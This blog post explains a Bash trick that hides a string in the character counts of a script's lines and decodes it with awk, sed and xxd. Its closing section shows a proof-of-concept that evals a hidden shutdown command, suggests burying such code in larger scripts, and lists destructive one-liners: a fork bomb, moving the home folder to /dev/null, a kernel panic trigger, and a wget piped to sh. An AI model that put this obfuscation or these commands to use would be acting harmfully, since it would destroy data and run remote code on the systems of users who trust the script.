---
layout: post
date: 2017-08-25 23:00
title:  "Using Piphilology with Bash to hide magic commands"
category: blog
tags: Linux/Bash
---
A few days ago, [/u/-where_am_i](https://www.reddit.com/user/-where_am_i-) posted [this declaration](https://www.reddit.com/r/bash/comments/6vf8yi/i_have_to_find_a_hobby_other_then_bash/) on [/r/bash](https://www.reddit.com/r/bash/):

```bash
echo '''
Well I wrote your name and burned it
To see the color of the flame
And it burned out the whole spectrum
As if you were everything
Mine just burned gold
A normal flame
I am not anything

And all that I remember
Is the feeling of waking up
When we were kids you were the sun
To which my eyes would not adjust

When we were kids I was a fountain
You could never drink enough
Then came all the boys who swept you up
Played careless with your heart

And every night there was a new girl
Sitting beside me in my car
Something dies when you grow older
But you do the best you can

I am glad
I am glad
You found a good man
''' | tr ' ' '\n' | sort | uniq |
  grep "^do$\|ry$\|our$\|^a$" |
  sed 's/a/I/g' | sed 's/^d/l/g' |
  sed 's/^e\|ry\|r//g' | tr '\n' ' ' |
  sed 's/\(o\) \(v\)/\1\2/g' && echo
```
You can [try it online](https://tio.run/##bVNLa@QwDL77V4hSmvYUdv/B7G0OhYUWykIYcGJN7B3HmvWjITD/fSrZ7baHYuL4Iel7KBl1stcrTpag6zr1gt7DHtZIGWGjEiHoBUEHA2OJAQ24rJ4JEiJkizCRpwh0rJuj51i1CxL0EU4l17vVkkdIZ5xyLIvaJXBHAYAVIwK@YtyydWFWjy4g/C3pf4WZvFE7CBQX7d8x9qAXPslM7D2twmomn63OrCDigsuIUe1T44boOU6orvokq3JWLxYDE2gcTs6kT0aSk0oQrat1k4VlA9wwwUrFm4ZthKb6pgobqBNoOFIJWbug/nDZqSWKVDDRhRNgoDJb9Sz5U7W58kcYaUviGKQVz7mSYra/vd7Yj0lH9Jg4wGXbemRRx9wsqE5CcLOtvjOjRiXgCrOLXj25nEX@iMkZBEZ1QcRxWfVEC1Y7wTiRKsQEfI60AreB7fxVGh9DjSmmtp90UK0ts9fmy0qkiw/cHW4lGVg4kj81uECO0MkYguwSxcyvEtw/uChgUDzDzcHQ7XCJG0@slOeDvr2p94m96FKv@30/1/y2P5jet4PPmANKCX76diPAAirjS6nhnoYHGO5fh4d@@DH8lOC7O5Cf43p9Aw), or I can spoil the surprise and tell you that it outputs "I love you".

That was sweet, but I wanted to respond with an even more cryptic script, so I decided to combine a few of my hobbies into the application of an idea that I have been playing with for a while. You can read through my process or <a href="#the-actual-script">jump to my final solution</a>.

What is Piphilology?
--------------------
First off, we need some background on Piphilology.  [Wikipedia](https://en.wikipedia.org/wiki/Piphilology) gives a good summary:

> Piphilology comprises the creation and use of mnemonic techniques to
> remember a span of digits of the mathematical constant pi.

I know this because I spent way too long memorizing digits of pi to impress the girls back in middle school and this is a very helpful trick for the difficult sections.

Here is a fun example of the first 20 digits:

> Pie
>
> I wish I could determine pi
>
> Eureka, cried the great inventor
>
> Christmas pudding, Christmas pie
>
> Is the problem's very center.

Notice how the character count of each word corresponds to each digit. Here is my annotated version if you don't get it:

> Pie (3)
>
> I (1) wish (4) I (1) could (5) determine (9) pi (2)
>
> Eureka (6), cried (5) the (3) great (5) inventor (8)
>
> Christmas (9) pudding (7), Christmas (9) pie (3)
>
> Is (2) the (3) problem's (8) very (4) center. (6)

Which encodes 3.14159265358979323846.

This idea has been taken incredibly far; there is even an almost 4000 digit version call the [Cadaeic Cadenza](http://www.cadaeic.net/cadenza.htm) or the 10,000 digit book called "[*Not a Wake*](http://www.cadaeic.net/notawake.htm)".

How does this relate to Bash?
---------------------
There is probably a better word to describe what I am really doing, but Piphilology sounds cool and it is the closest term I know of. So let's stick with that.

I don't need Bash to remember the digits of pi,  but I *am* going to use a similar method to encode my message.

Instead of the using the characters of each word to represent a digit, let's use the amount of characters on each line to represent a [hexadecimal](https://en.wikipedia.org/wiki/Hexadecimal) number that we can concatenate and convert into a human-readable string.

The actual script
-----------------
Enough definitions,  you can [try my script online](https://tio.run/##JVDBSgMxFLznK6atsAqWdQ9WEOpBoeBN6NVLmn3dBNMkJq/dovXb17dbcnkz8zIzvJ0udhgWs3rnQr0ToBZqga07JE8oJrvE4IhMJcXQjiNbQnCG0JLxOmt2MRTEPXw8kVKFGCnSoaxH3Ape@wIlphuXC9@jl@9Ek1UnuyUeCC6kI5eRMjGcKE@ZxsZYCPGY4YmZsqQcWZKUJd1iafDUoG7pVP9QjmPCmycd4BhK91@obj2Fju1L09z9puwC40r8Vbh5wIUzqs9QQd4FRRpVpW4e69W@7qrL@SwJCcs8@n7oLEUcq2d0mYT9xjxQPx@1rY39VSIpjPnGBVfsJL1PJ8GrZmOhBfBMDcM/) or here is the code:

```bash
#!/bin/bash
#
# Simple script to respond to the nice declarations of love

set poems=loved
se=ls

# First, we need to get some inputs to convert to choose our letters out of
head -c 71 /dev/zero

# Clean it
awk '(length>11){print length}' $0 |tr '\n' ' '| sed 's/15/6f/g'|xxd -p -r

# Parse it
: grep -q "new"

# Show it
: echo "Finish"

# I love Batch a lot!
```

At first glance, this just looks like a really poorly written bash script (and that is what I was going for), but it actually outputs:

```bash
You too!
```

A string that never obviously appears in the script itself. So let's break it down like it is a magic trick.

The Pledge
------------

> Every great magic trick consists of three parts or acts. The first
> part is called "The Pledge". The magician shows you something
> ordinary: a deck of cards, a bird or a man. He shows you this object.
> Perhaps he asks you to inspect it to see if it is indeed real,
> unaltered, normal. But of course... it probably isn't.
> - [The Prestige by Christopher Priest](https://www.goodreads.com/work/quotes/1688160-the-prestige)

"The Pledge" is the format of the script:

 - It is a valid Bash script.
 - [Shellcheck](www.shellcheck.net) doesn't throw any major errors.
 - It is commented, albeit poorly.
 - I got messages trying to critique parts that don't matter, so some people obviously fell for it without actually running it.

The Turn
--------

> The second act is called "The Turn". The magician takes the ordinary
> something and makes it do something extraordinary. Now you're looking
> for the secret... but you won't find it, because of course you're not
> really looking. You don't really want to know. You want to be fooled.
> But you wouldn't clap yet.
> - [The Prestige by Christopher Priest](https://www.goodreads.com/work/quotes/1688160-the-prestige)

"The Turn" is the character count of each line. Here is an annotated version of my script:

```bash
(11 Characters) #!/bin/bash
(1  Characters) #
(59 Characters) # Simple script to respond to the nice declarations of love
(0  Characters)
(15 Characters) set poems=loved
(6  Characters) se=ls
(0  Characters)
(75 Characters) # First, we need to get some inputs to convert to choose our letters out of
(20 Characters) head -c 71 /dev/zero
(0  Characters)
(11 Characters) # Clean it
(74 Characters) awk '(length>11){print length}' $0 |tr '\n' ' '| sed 's/15/6f/g'|xxd -p -r
(0  Characters)
(10 Characters) # Parse it
(15 Characters) : grep -q "new"
(0  Characters)
(9  Characters) # Show it
(15 Characters) : echo "Finish"
(0  Characters)
(21 Characters) # I love Batch a lot!
```

This is interesting, but not doing anything apparent. Let's move onto the only actual line of code.

The Prestige
------------

> [M]aking something disappear isn't enough; you have to bring it back.
> That's why every magic trick has a third act, the hardest part, the
> part we call "The Prestige".”
> - [The Prestige by Christopher Priest](https://www.goodreads.com/work/quotes/1688160-the-prestige)

Hopefully you didn't spend too long on the first section trying to decipher my unintelligible script and comments because "The Prestige" here is only the one line in the middle:

```bash
awk '(length>11){print length}' $0 |tr '\n' ' '| sed 's/15/6f/g'|xxd -p -r
```

It's not as cool as Sir Michael Caine when he delivers "The Prestige" line in the movie, but there is a lot going on here so I will break it down some more.

### Counting the characters
```bash
awk '(length>11){print length}' $0
```

Here, `awk` is counting the amount of characters (`{print length}`) on each line of the currently running script  (`$0`) that are above 11 characters (`(length>11)`).

This is the updated version of what `awk` sees:

```bash
(             ) #!/bin/bash
(             ) #
(59 Characters) # Simple script to respond to the nice declarations of love

(15 Characters) set poems=loved
(             ) se=ls

(75 Characters) # First, we need to get some inputs to convert to choose our letters out of
(20 Characters) head -c 71 /dev/zero

(             ) # Clean it
(74 Characters) awk '(length>11){print length}' $0 |tr '\n' ' '| sed 's/15/6f/g'|xxd -p -r

(             ) # Parse it
(15 Characters) : grep -q "new"

(             ) # Show it
(15 Characters) : echo "Finish"

(21 Characters) # I love Batch a lot!
```

The lines with no character counts don't matter at all and are just misdirections.

> **Note:** There was no concrete reason to pick 11 as the cutoff, but I
> needed to get rid of the shebang line and it ended up working
> well with the characters that I needed.

You might be tempted to go ahead and throw the sequence (59 15 75 20 74 15 15 21) into a hex converter now, but it would be gibberish, so hold off for a little bit longer.

### Remove the new lines

```bash
|tr '\n' ' '
```

 Since `awk` prints out a new line (`\n`) delimited list, let's switch to spaces so that the next commands will be easier. I'm sure you could do this in `awk` itself. But I needed to bump the character count of this line to 74 anyway since it counts itself for the script.

### Inject the alpha characters

We are only counting lines by decimal, and hexadecimal also uses alpha characters, so I need to add the proper characters:

```bash
| sed 's/15/6f/g'
```

This will change the sequence from (59 15 75 20 74 15 15 21) to (59 6f 75 20 74 6f 6f 21) which is needed because "6f" is the encoding for "o" which I use a lot. 15 was an arbitrary choice because I just needed a placeholder number over 11 that could transformed to what I really wanted.

This isn't exactly a scalable solution when you need characters outside what I used as more complicated switches may occur if you need a lot of hex characters

> **Note:** You can check what substitutions you will need to perform using `man ascii`. Here is the full hex table:

```bash
   2 3 4 5 6 7
 -------------
0:   0 @ P ` p
1: ! 1 A Q a q
2: " 2 B R b r
3: # 3 C S c s
4: $ 4 D T d t
5: % 5 E U e u
6: & 6 F V f v
7: ' 7 G W g w
8: ( 8 H X h x
9: ) 9 I Y i y
A: * : J Z j z
B: + ; K [ k {
C: , < L \ l |
D: - = M ] m }
E: . > N ^ n ~
F: / ? O _ o DEL
```

### Convert to hex

```bash
|xxd -p -r
```

[`xxd`](https://linux.die.net/man/1/xxd) is a great tool for creating hexdumps, but it can also do the reverse:

> -p | -ps | -postscript | -plain
> output in postscript continuous hexdump style. Also known as plain hexdump style.
>
> -r | -revert
> reverse operation: convert (or patch) hexdump into binary.
> If not writing to stdout, xxd writes into its output file
> without truncating it. Use the combination -r -p to read plain
> hexadecimal dumps without line number information and without a
> particular column layout. Additional Whitespace and line-breaks are
> allowed anywhere.

Which finally outputs the needed string "You too!"

### Bonus: Explaining the other commands

Just in case you were wondering how the other commands didn't interfere with my output even though they were executed, here is a quick summary:

```bash
set poems=loved
```

The [`set`](https://www.gnu.org/software/bash/manual/bash.html#The-Set-Builtin) builtin lets you set (duh) options and parameters in the shell.

The way I used it here does nothing, but I included it because I have seen a fair amount of people who know how to program in other languages, but not Bash, try to assign variables like this. It's just sort of a misdirection to convince you that I was trying to work on the string "loved" somewhere. Plus I needed 15 characters.

```bash
se=ls
```

Assigns a variable `se` but I never use it. Also it makes it look like I was trying to use the `ls` command somewhere without a properly setting it up for [parameter expansion](https://www.gnu.org/software/bash/manual/bash.html#Shell-Parameter-Expansion), a common mistake as well. This doesn't actually count towards anything as it falls under the 11 character cutoff, but it adds a layer of fun.

```bash
head -c 71 /dev/zero
```

Just pulls 71 null characters and then does nothing. I included it to try to indicate that I was going to replace something as this is a common technique for printing a set amount of characters (See [my other post](https://grayson.sh/blog/some-alternatives-to-hr) about that). 71 is a random number that means nothing to the rest of the script.

```bash
: grep -q "new"

: echo "Finish"
```
I got lazy here and just did two normal commands that will never execute because of one of my favorite Bash builtins, the colon character ( : ).

From the [Bash Reference Manual](https://www.gnu.org/software/bash/manual/bash.html#index-_003a):

> : (a colon)
>
>  : [arguments]
>  Do nothing beyond expanding arguments and performing redirections. The return status is zero.

This is great to throw in front of any commands that you don't want to commit to. An experienced reviewer could spot that pretty quickly in my Trojan Horse of a script, but that doesn't matter too much because none of it would hold up to review for too long anyway.

Other Applications
------------------

In the above example, I just used Piphilology to hide the string that I wanted to output. More evil-minded readers may have already figured out where I am going next with this.

Instead of just outputting a string, let's make a string and then execute it as a command.

Here is a proof of concept script that triggers `init 0` (69 6e 69 74 20 30) to shut down your computer with only comments:

```bash
#!/bin/bash
# First, you need to pipe my cool github library into your root shell

# Delete /

# Then, renice my program to give me all the ram, cpu, and disk space

# Next, we need to install these twelve other libraries to enable webscale

# Clean up / & ~ dir

# Finally, go favorite my repo

eval $(awk '$0 ~ /# [A-Z]/ {print length}' $0|tr '\n' ' '| sed 's/10/6e/g'|xxd -p -r)
```

> **Note:** This won't work on a `systemd` system if it was built with the `-SYSVINIT` compatibility flag like newer Arch installs are. You can (sometimes) check with  `init --version`

The only difference here is that `awk` just looks for any line that starts with a # then a space and a capitalized alphabetical character to count the total.

Since you don't have to worry about other commands messing up your output like in my previous example, you could easily hide this in a bigger script that actually does real things at the same time. Most people also ignore comments because they don't do anything in Bash scripts, so you would just need to obfuscate the actual command part. Possibly with some misdirection by assigning parts to variables or multi-line pipes with a \ sign.

### Other Fun Ideas

 - `mv ~ /dev/null` is 6d 76 20 2f 20 2f 64 65 76 2f 6e 75 6c 6c
 - `:(){:|:&};:` is 3a 28 29 7b 3a 7c 3a 26 7d 3b 3a
 -  `echo 1 > /proc/sys/kernel/panic` is 65 63 68 6f 20 31 20 3e 20 2f 70 72 6f 63 2f 73 79 73 2f 6b 65 72 6e 65 6c 2f 70 61 6e 69 63
 -  `wget http://notarootkit.com -O- | sh` you'll have to find out yourself

Conclusion
----------
This is a very fun method of hiding things in plain sight and I am curious to see what other possible applications/methods there could be for this. Please send me an email if you know of one!